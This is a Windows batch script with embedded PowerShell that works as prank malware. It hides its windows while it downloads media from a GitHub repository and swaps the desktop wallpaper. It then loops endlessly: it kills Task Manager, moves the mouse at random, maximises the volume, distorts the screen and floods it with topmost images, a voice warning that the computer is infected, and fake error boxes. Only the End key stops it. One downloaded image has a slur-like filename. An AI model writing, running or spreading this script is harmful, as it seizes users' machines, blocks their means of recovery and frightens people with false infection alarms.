@echo off
chcp 65001 >nul

:: --- НАСТРОЙКИ ---
set "SITE_URL=https://www.youtube.com/watch?v=5JpA5SVVpac"
set "MUSIC_URL=https://raw.githubusercontent.com/Pecennn/testik/refs/heads/main/sex.mp4"
set "BASE_RAW=https://raw.githubusercontent.com/Pecennn/testik/main"
set "PHOTOS=a4.png kani.png lenin.png lev.png mge.png noshka.png shrek.png svin.png negritos.png kon.png pchelkon.png iaico.png polynichka.png"
set "WALL_URL=https://raw.githubusercontent.com/Pecennn/testik/main/%%D0%%BA%%D0%%BE%%D0%%BD%%D1%%8C.png"

:: [1/3] Загрузка ресурсов (скрыто)
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MUSIC_URL%', '%temp%\bg_music.mp4'); (New-Object Net.WebClient).DownloadFile('%WALL_URL%', '%temp%\h.png')"
for %%f in (%PHOTOS%) do (
    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BASE_RAW%/%%f', '%temp%\%%f')"
)

:: [2/3] Фоновые процессы: Музыка, Сайт и Обои
(echo Set P = CreateObject^("WMPlayer.OCX"^): P.URL="%temp%\bg_music.mp4": P.Controls.play: do while P.currentmedia.duration=0: wscript.sleep 10: loop: wscript.sleep 300000) > "%temp%\s.vbs"
start /b wscript.exe "%temp%\s.vbs"
start "" "%SITE_URL%"
powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; [W]::SystemParametersInfo(20, 0, '%temp%\h.png', 3)"

:: [3/3] ЦЕНТРАЛЬНЫЙ АПОКАЛИПСИС (GDI + ГОЛОС + БЕШЕНАЯ МЫШЬ + СПАМ)
start /b powershell -WindowStyle Hidden -Command ^
    "$w=New-Object -ComObject WScript.Shell; $v=New-Object -ComObject SAPI.SpVoice; ^
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing; ^
    $ph='%PHOTOS%'.Split(' '); $fs=New-Object System.Collections.Generic.List[PSObject]; ^
    $sc=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
    foreach($p in $ph){ $path=Join-Path $env:TEMP $p; if(Test-Path $path){ try{ ^
        $img=[System.Drawing.Image]::FromFile($path); $f=New-Object System.Windows.Forms.Form; ^
        $f.FormBorderStyle='None'; $f.StartPosition='Manual'; $f.TopMost=$true; $f.ShowInTaskbar=$false; ^
        $f.Width=350; $f.Height=[int](350*($img.Height/$img.Width)); $f.BackgroundImage=$img; ^
        $f.BackgroundImageLayout='Stretch'; $o=[PSCustomObject]@{F=$f;X=(Get-Random -Min 0 -Max ($sc.Width-350));Y=(Get-Random -Min 0 -Max ($sc.Height-350));DX=(15+(Get-Random -Min 1 -Max 5));DY=(15+(Get-Random -Min 1 -Max 5))}; ^
        $fs.Add($o); $f.Show() }catch{} } }; ^
    $API=Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int v); [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr h); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hDest, int xDest, int yDest, int w, int h, IntPtr hSrc, int xSrc, int ySrc, int rop);' -Name 'W32' -PassThru; ^
    $hdc=$API::W32::GetDC([IntPtr]::Zero); $tick=0; ^
    while($true){ ^
        if($API::W32::GetAsyncKeyState(35) -ne 0){ break }; ^
        Stop-Process -Name taskmgr -ErrorAction SilentlyContinue; ^
        $w.SendKeys([char]175); ^
        if($v.Status.RunningState -ne 2){ $v.Speak('Ваш компьютер заражен червяками', 1) }; ^
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(([System.Windows.Forms.Cursor]::Position.X + (Get-Random -Min -150 -Max 150)), ([System.Windows.Forms.Cursor]::Position.Y + (Get-Random -Min -150 -Max 150))); ^
        $tick++; if($tick -ge 4){ ^
            $API::W32::BitBlt($hdc, (Get-Random -Min -10 -Max 10), (Get-Random -Min -10 -Max 10), $sc.Width, $sc.Height, $hdc, 0, 0, 0x00550009); ^
            if((Get-Random -Min 0 -Max 25) -eq 5){ start powershell -Command \"[DllImport('user32.dll')] public static extern int MessageBox(IntPtr h, string m, string c, int t); [W32]::MessageBox(0, 'Лошади бест', 'ERROR', 0x10)\" }; ^
            $tick=0 }; ^
        foreach($o in $fs){ $o.X+=$o.DX; $o.Y+=$o.DY; if($o.X -le 0 -or $o.X+$o.F.Width -ge $sc.Width){$o.DX=-$o.DX}; if($o.Y -le 0 -or $o.Y+$o.F.Height -ge $sc.Height){$o.DY=-$o.DY}; $o.F.Location=New-Object System.Drawing.Point($o.X,$o.Y) }; ^
        [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -m 15 }"

exit
